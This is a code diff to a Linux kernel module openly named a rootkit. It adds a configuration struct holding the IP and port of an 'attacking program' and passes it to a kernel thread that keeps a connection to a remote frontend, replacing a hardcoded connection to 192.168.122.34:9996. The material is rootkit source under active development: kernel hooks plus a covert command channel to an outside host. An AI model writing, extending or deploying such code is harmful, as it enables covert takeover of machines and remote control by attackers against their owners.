@@ -15,6 +15,14 @@ MODULE_PARM_DESC(port, "Port number of the attacking program");
 
 static __init int rootkit_init(void)
 {
+    struct config *cfg = kmalloc(sizeof(struct config), GFP_KERNEL);
+    if (!cfg)
+    {
+        pr_err("rootkit: kmalloc for config struct failed. exiting.\n");
+        return 0;
+    }
+    cfg->ip = ip;
+    cfg->port = port;
     pr_info("rootkit: inserted.\n");
     pr_info("rootkit: setting hooks up...\n");
     if ((setup_hooks()) != 0)
@@ -22,14 +30,9 @@ static __init int rootkit_init(void)
         pr_err("rootkit: could not set hooks up. exiting.\n");
         return 0;
     }
-    if ((network_init("192.168.122.34", 9996)) != 0)
-    {
-        pr_warning("rootkit: could not initialize connection. exiting.");
-        return 0;
-    }
 
     // Network setup succeeded. Start thread to keep connection with frontend:
-    thread = kthread_run(network_loop, NULL, "loop_thread");
+    thread = kthread_run(network_loop, cfg, "loop_thread");
     if (IS_ERR(thread))
     {
         pr_err("rootkit: thread failed to start\n");
